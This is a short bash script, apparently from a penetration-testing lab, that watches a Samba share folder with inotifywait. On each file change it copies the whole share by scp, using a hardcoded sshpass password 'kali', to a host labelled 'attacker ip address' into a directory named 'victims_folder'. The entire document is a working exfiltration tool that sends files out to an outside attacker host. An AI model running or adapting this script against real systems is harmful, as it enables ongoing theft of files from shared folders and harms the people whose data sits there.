#!/bin/bash

REMOTE_USER="kali"
REMOTE_HOST="attacker ip address"
REMOTE_DIR="/home/kali/Desktop/victims_folder"

function share_file {
  sshpass -p 'kali' scp /samba/MyFolder/* "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DIR"
}

inotifywait -m /samba/MyFolder -e create,modify,delete |
while read path action file; do
  share_file
done